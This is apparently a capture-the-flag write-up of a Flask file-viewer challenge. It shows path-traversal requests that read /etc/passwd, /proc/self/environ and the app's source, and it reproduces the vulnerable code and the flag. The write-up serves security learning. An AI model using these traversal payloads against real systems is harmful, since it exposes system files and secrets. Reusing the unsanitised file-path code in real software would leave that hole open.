<img width="593" height="393" alt="Screenshot 2025-08-27 235616" src="https://github.com/user-attachments/assets/1b63c3d1-3b75-4224-995f-7a305adcc6d6" />

# Challenge

This challenge had nothing else display on the front side, Just a plain web with a text Ancient Manuscripts Archive

<img width="1151" height="647" alt="Screenshot 2025-08-28 000001" src="https://github.com/user-attachments/assets/db96fe69-4208-4331-8e10-a6e55094e83f" />

## Solution

1. Ran gobuster and found endpoints `/archive` and `/console`.

- `/archive` - gave usage hint (?page=file_name.txt).

- `/console` - always returned 400 Bad Request so im guessing its likely rabbit hole.

<img width="528" height="337" alt="image" src="https://github.com/user-attachments/assets/4c311e42-6573-473b-a3b8-8b0141ffbdab" />

2. Testing for LFI

Sent /archive?page=../../../../etc/passwd

<img width="574" height="399" alt="image" src="https://github.com/user-attachments/assets/9cb27e04-e441-4bb7-b4b2-47020d97bb32" />

`/etc/passwd` is the go-to canary file. If it shows user accounts, LFI is real.

3. Fingerprinting the Environment

Tried /archive?page=../../../../proc/self/environ

<img width="1908" height="148" alt="image" src="https://github.com/user-attachments/assets/fc943561-dbcf-43ea-ba6b-8017e2f8cfc4" />

```
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=9a35ca495f14LANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568PYTHON_VERSION=3.9.23PYTHON_SHA256=61a42919e13d539f7673cf11d1c404380e28e540510860b9d242196e165709c9HOME=/rootWERKZEUG_SERVER_FD=5WERKZEUG_RUN_MAIN=true
```

Found: PYTHON_VERSION=3.9, WERKZEUG_RUN_MAIN=true - Python Flask/Werkzeug server.

HOME=/root, running as root.

Tried `/archive?page=../../../../proc/self/cmdline`

<img width="640" height="146" alt="image" src="https://github.com/user-attachments/assets/748aaf72-b73c-4c29-af47-0a7294143e35" />

Showed: `/usr/local/bin/python/app.py` - the app entrypoint.

`/proc` is a goldmine: environ shows env vars (sometimes FLAG=...), cmdline reveals how the app was launched.

4. Current Working Directory Enumeration

`/archive?page=../../../../proc/self/cwd/` - follow CWD symlink to app root.

Checked `/proc/self/cwd/app.py`

<img width="620" height="988" alt="image" src="https://github.com/user-attachments/assets/d6d810aa-7980-4ae8-ae92-98caf3abda02" />

LFI can use /proc/self/cwd/ to read files relative to the app’s actual working directory, bypassing path guesswork.

5. Reading Source Code

LFI can use /proc/self/cwd/ to read files relative to the app’s actual working directory, bypassing path guesswork.

Code snippet showed:

```
from flask import Flask, request, render_template, abort
import os
import time

app = Flask(__name__)

BASE_DOCUMENT_PATH = 'documents'


@app.before_request
def slow_down_all_requests():
    time.sleep(0.2)


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/archive')
def archive():
    file_name = request.args.get('page')

    if not file_name:
        return """
        
Archive Document Viewer

        
To view a document, use the ?page=file_name.txt parameter.


        
For example: /archive?page=manuscript1.txt


        """, 400

    try:
        file_path = os.path.join(BASE_DOCUMENT_PATH, file_name)
        
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        return f'
{content}
'

    except FileNotFoundError:
        abort(404, f"File not found: {file_name}")
    except Exception as e:
        abort(500, f"Internal server error: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)








# Folder: ../.secret
```

`BASE_DOCUMENT_PATH = 'documents'`
`# Folder: ../.secret`

## Flag

This revealed the hidden folder containing the flag.

<img width="555" height="186" alt="image" src="https://github.com/user-attachments/assets/f3e625b0-aac0-4e93-aa14-72671f697b61" />

```
n3xt{Y0U_F0UND_TH3_S3CR3T_F1L3!!!!!!}
```
